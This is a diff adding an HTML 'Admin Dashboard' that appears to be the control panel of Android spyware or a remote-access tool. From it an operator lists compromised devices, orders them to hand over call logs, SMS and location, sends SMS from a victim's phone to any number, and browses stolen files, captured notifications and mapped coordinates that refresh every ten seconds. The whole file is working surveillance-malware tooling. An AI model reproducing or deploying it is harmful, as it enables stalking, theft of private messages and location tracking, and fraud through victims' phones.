@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Admin Dashboard</title>
+    <style>
+        :root {
+            --bg: #0f172a;
+            --surface: #1e293b;
+            --primary: #3b82f6;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --border: #334155;
+            --success: #10b981;
+            --danger: #ef4444;
+        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
+        body { background: var(--bg); color: var(--text-main); }
+        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
+        header { border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center;}
+        h1 { font-size: 1.5rem; }
+        .refresh-btn { background: var(--primary); color: white; border: none; padding: 8px 16px; border-radius: 6px; cursor: pointer; font-weight: bold;}
+        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
+        .card h2 { font-size: 1.2rem; margin-bottom: 15px; border-bottom: 1px solid var(--border); padding-bottom: 10px;}
+        
+        .device-item { display: flex; justify-content: space-between; align-items: center; padding: 10px; background: rgba(255,255,255,0.05); border-radius: 8px; margin-bottom: 10px;}
+        .device-info { display: flex; flex-direction: column; }
+        .device-name { font-weight: bold; font-size: 1.1rem;}
+        .device-id { font-size: 0.8rem; color: var(--text-muted); }
+        
+        button { background: var(--surface); color: var(--text-main); border: 1px solid var(--border); padding: 8px 12px; border-radius: 6px; cursor: pointer; margin: 4px; transition: 0.2s; }
+        button:hover { background: var(--primary); border-color: var(--primary); }
+        
+        .list-item { padding: 10px; border-bottom: 1px solid var(--border); }
+        .list-item:last-child { border-bottom: none; }
+        .timestamp { font-size: 0.8rem; color: var(--text-muted); margin-bottom: 4px;}
+        .data-content { font-size: 0.95rem; }
+        
+        .tabs { display: flex; margin-bottom: 15px; border-bottom: 1px solid var(--border);}
+        .tab { padding: 10px 20px; cursor: pointer; color: var(--text-muted); border-bottom: 2px solid transparent;}
+        .tab.active { color: var(--primary); border-bottom-color: var(--primary); font-weight: bold;}
+        
+        .hidden { display: none; }
+        a { color: var(--primary); text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>📡 Admin Dashboard</h1>
+            <button class="refresh-btn" onclick="fetchData()">🔄 Refresh</button>
+        </header>
+
+        <div class="card">
+            <h2>📱 Online Devices</h2>
+            <div id="deviceList">Loading...</div>
+        </div>
+
+        <div class="card">
+            <div class="tabs">
+                <div class="tab active" onclick="switchTab('files')">Files (Logs)</div>
+                <div class="tab" onclick="switchTab('notifications')">Notifications</div>
+                <div class="tab" onclick="switchTab('locations')">Locations</div>
+            </div>
+            
+            <div id="filesList" class="tab-content">Loading files...</div>
+            <div id="notificationsList" class="tab-content hidden">Loading notifications...</div>
+            <div id="locationsList" class="tab-content hidden">Loading locations...</div>
+        </div>
+    </div>
+
+    <script>
+        function sendCommand(deviceId, command) {
+            let body = { deviceId, command };
+            if (command === 'ms') {
+                const to = prompt("Enter target phone number:");
+                if (!to) return;
+                const msg = prompt("Enter SMS message:");
+                if (!msg) return;
+                body.smsTo = to;
+                body.smsBody = msg;
+            }
+            fetch('/admin/command', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(body)
+            }).then(res => res.json()).then(data => {
+                alert(data.message || data.error);
+            }).catch(e => alert("Error: " + e));
+        }
+
+        async function fetchData() {
+            try {
+                // Fetch Devices
+                const devRes = await fetch('/admin/devices');
+                const devices = await devRes.json();
+                const devContainer = document.getElementById('deviceList');
+                if (devices.length === 0) {
+                    devContainer.innerHTML = "<p style='color:var(--text-muted)'>No devices online</p>";
+                } else {
+                    devContainer.innerHTML = devices.map(d => `
+                        <div class="device-item">
+                            <div class="device-info">
+                                <span class="device-name">${d.name}</span>
+                                <span class="device-id">${d.id}</span>
+                            </div>
+                            <div class="device-actions">
+                                <button onclick="sendCommand('${d.id}', 'ch')">📞 Calls</button>
+                                <button onclick="sendCommand('${d.id}', 'as')">💬 SMS</button>
+                                <button onclick="sendCommand('${d.id}', 'loc')">📍 Location</button>
+                                <button onclick="sendCommand('${d.id}', 'ms')">📤 Send SMS</button>
+                            </div>
+                        </div>
+                    `).join('');
+                }
+
+                // Fetch Files
+                const filesRes = await fetch('/admin/files');
+                const files = await filesRes.json();
+                document.getElementById('filesList').innerHTML = files.length ? files.map(f => `
+                    <div class="list-item">
+                        <div class="timestamp">${new Date(f.timestamp).toLocaleString()} - ${f.deviceName}</div>
+                        <div class="data-content">📄 <a href="${f.url}" target="_blank">${f.originalname}</a></div>
+                    </div>
+                `).join('') : "<p style='color:var(--text-muted)'>No files uploaded yet</p>";
+
+                // Fetch Notifications
+                const notifRes = await fetch('/admin/notifications');
+                const notifications = await notifRes.json();
+                document.getElementById('notificationsList').innerHTML = notifications.length ? notifications.map(n => `
+                    <div class="list-item">
+                        <div class="timestamp">${new Date(n.timestamp).toLocaleString()} - ${n.deviceName}</div>
+                        <div class="data-content">${n.text.replace(/\\n/g, '<br>')}</div>
+                    </div>
+                `).join('') : "<p style='color:var(--text-muted)'>No notifications</p>";
+
+                // Fetch Locations
+                const locRes = await fetch('/admin/locations');
+                const locations = await locRes.json();
+                document.getElementById('locationsList').innerHTML = locations.length ? locations.map(l => `
+                    <div class="list-item">
+                        <div class="timestamp">${new Date(l.timestamp).toLocaleString()} - ${l.deviceName}</div>
+                        <div class="data-content">📍 <a href="https://www.google.com/maps?q=${l.latitude},${l.longitude}" target="_blank">${l.latitude}, ${l.longitude}</a></div>
+                    </div>
+                `).join('') : "<p style='color:var(--text-muted)'>No locations</p>";
+
+            } catch (e) {
+                console.error("Failed to fetch data", e);
+            }
+        }
+
+        function switchTab(tabId) {
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.add('hidden'));
+            
+            event.target.classList.add('active');
+            document.getElementById(tabId + 'List').classList.remove('hidden');
+        }
+
+        fetchData();
+        setInterval(fetchData, 10000); // Auto-refresh every 10s
+    </script>
+</body>
+</html>
